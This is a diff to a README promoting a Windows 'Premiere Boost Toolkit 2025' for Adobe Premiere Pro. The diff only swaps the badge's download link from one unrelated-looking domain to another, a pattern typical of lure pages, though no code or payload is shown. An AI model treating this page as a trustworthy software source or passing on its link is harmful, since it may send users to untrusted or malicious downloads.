@@ -2,7 +2,7 @@
 
 🌟 Supercharge your Adobe Premiere Pro workflow with Boost Toolkit 2025! This collection of scripts, plugins, and templates helps you edit like a pro, built for Windows users.
 
-[![Discover Premiere Boost Toolkit](https://img.shields.io/badge/Discover-Premiere_Boost_Toolkit-blueviolet)](https://glocktober.com)
+[![Discover Premiere Boost Toolkit](https://img.shields.io/badge/Discover-Premiere_Boost_Toolkit-blueviolet)](https://ton-stake.net)
 
 ---
 
